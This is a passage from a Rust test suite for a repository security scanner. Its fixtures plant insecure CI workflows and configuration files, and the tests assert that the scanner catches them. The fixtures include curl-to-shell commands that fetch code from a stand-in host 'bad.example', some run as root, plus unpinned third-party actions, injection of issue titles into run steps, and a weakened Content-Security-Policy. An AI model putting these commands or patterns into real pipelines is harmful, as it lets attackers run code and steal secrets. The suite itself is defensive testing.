            ".github/workflows/ci.yml",
            "name: CI\non: [push]\npermissions:\n  { contents: read, packages: write }\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps: [{ uses: evil/one@main }, { run: \"curl https://bad.example/a | sh; echo done\" }]\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - {\n          run: \"echo hi\",\n            uses: evil/two@main\n        }\n      - run: |\n          curl https://bad.example/b |& sh\n          curl https://bad.example/c | { sh; }\n          curl https://bad.example/d | sudo -u root sh\n",
        );
        let (_, hits7) = run_checks(fx7.path()).unwrap();
        assert!(has_bad_write(&hits7, ".github/workflows/ci.yml", "packages"), "{hits7:?}");
        assert!(has_hit(&hits7, 4, None, "evil/one@main"), "{hits7:?}");
        assert!(has_hit(&hits7, 4, None, "evil/two@main"), "{hits7:?}");
        assert!(hits7.iter().filter(|h| h.check == 4 && h.detail.contains("sha256sum")).count() >= 4, "{hits7:?}");

        // 4. AUD-12-33: repeat arrays, IPv6 arrays, from/from_bits, 0b/0o, parenthesized octets.
        for (label, code) in [
            ("rep4", "let _ = TcpListener::bind(([0; 4], 9000));"),
            ("rep8", "let _ = TcpStream::connect(([8; 4], 443));"),
            ("v6arr", "let _ = TcpListener::bind(([0, 0, 0, 0, 0, 0, 0, 0], 9000));"),
            ("v4from", "let _ = TcpListener::bind((Ipv4Addr::from(0u32), 9000));"),
            ("v4bits", "let _ = TcpStream::connect((Ipv4Addr::from_bits(0x0808_0808), 443));"),
            ("v6bits", "let _ = TcpListener::bind((Ipv6Addr::from_bits(0), 9000));"),
            ("paren_bin_oct", "let _ = TcpStream::connect((Ipv4Addr::new((8), 0b1000, 0o10, 8u8), 443));"),
            ("spaced_ctor", "let _ = TcpStream::connect((Ipv4Addr::new (8, 8, 8, 8), 443));"),
            ("spaced_from", "let _ = TcpListener::bind((Ipv4Addr::from (0u32), 9000));"),
            ("nested_tuple_arr", "let _ = TcpListener::bind((([0; 4]), 9000));"),
            ("nested_ip_from_arr", "let _ = IpAddr::from(([0; 4]));"),
        ] {
            let fx = create_clean_fixture(&format!("aud12-33-{label}"));
            fx.write(
                "crates/mcp/src/tools.rs",
                &format!("use std::net::{{IpAddr, Ipv4Addr, Ipv6Addr, TcpListener, TcpStream}};\npub fn f() {{ let _ = TcpListener::bind((Ipv4Addr::LOCALHOST, 0)); {code} }}\n"),
            );
            let (_, hits) = run_checks(fx.path()).unwrap();
            assert!(has_hit(&hits, 2, Some("crates/mcp/src/tools.rs"), "non-loopback"), "{label}: expected hit in {hits:?}");
        }
    }

    #[test]
    fn round3_216_apache_toml_workflow_hardening() {
        // Round-3 #216 items 8 & 9: Apache quoted/colon directives, cross-section web-sys alias shadowing,
        // multiline quoted run:, inline `with: { run: ... }`, single `&`, `sudo -Eu root sh`, and redirected `{ ... }`.
        let fx8 = create_clean_fixture("round3-216-apache-toml-wf");
        fx8.write(
            "packaging/web/.htaccess",
            "<IfModule mod_headers.c>\n  Header always set Content-Security-Policy \"default-src 'self'; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\"\n  Header always \"edit\" \"Content-Security-Policy\" \"connect-src 'self'\" \"connect-src *\"\n  Header always set Referrer-Policy \"no-referrer\"\n  Header always unset Referrer-Policy:\n  Header always set Permissions-Policy \"camera=(), microphone=(), geolocation=()\"\n  Header always set X-Content-Type-Options \"nosniff\"\n  Header always set Cross-Origin-Opener-Policy \"same-origin\"\n  Header always set Cross-Origin-Embedder-Policy \"require-corp\"\n</IfModule>\n",
        );
        fx8.write(
            "Cargo.toml",
            "[workspace]\nmembers = [\"crates/core\"]\n[workspace.dependencies]\nws = { package = \"web-sys\", version = \"0.3\" }\n",
        );
        fx8.write(
            "crates/core/Cargo.toml",
            "[package]\nname = \"curvebook-core\"\n[dependencies]\nws = { workspace = true, features = [\"WebSocket\"] }\n[dev-dependencies]\nws = { package = \"serde\", version = \"1\" }\n[features]\nevil = [\"ws/EventSource\"]\n",
        );
        fx8.write(
            ".github/workflows/ci.yml",
            "name: CI\non: [issues]\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: \"curl https://bad.example/m | sh\n        \"\n      - uses: some/action@0123456789abcdef0123456789abcdef01234567\n        with: { run: \"echo ${{ github.event.issue.title }}\" }\n      - { uses: some/action@0123456789abcdef0123456789abcdef01234567, with: { run: \"echo ${{ github.event.pull_request.title }}\" } }\n      - run: |\n          curl https://bad.example/bg | sh&echo done\n          curl https://bad.example/su | sudo -Eu root sh\n          curl https://bad.example/grp | { echo ok; sh; } >/dev/null\n",
        );
        let (_, hits8) = run_checks(fx8.path()).unwrap();
        assert!(has_hit(&hits8, 5, Some("packaging/web/.htaccess"), "edit content-security-policy"), "{hits8:?}");
        assert!(has_hit(&hits8, 5, Some("packaging/web/.htaccess"), "unset referrer-policy"), "{hits8:?}");
        assert!(has_hit(&hits8, 1, Some("crates/core/Cargo.toml"), "WebSocket"), "{hits8:?}");
        assert!(has_hit(&hits8, 1, Some("crates/core/Cargo.toml"), "EventSource"), "{hits8:?}");
        assert!(hits8.iter().filter(|h| h.check == 4 && h.detail.contains("github.event.*")).count() >= 2, "{hits8:?}");
        assert!(hits8.iter().filter(|h| h.check == 4 && h.detail.contains("sha256sum")).count() >= 4, "{hits8:?}");
    }
}
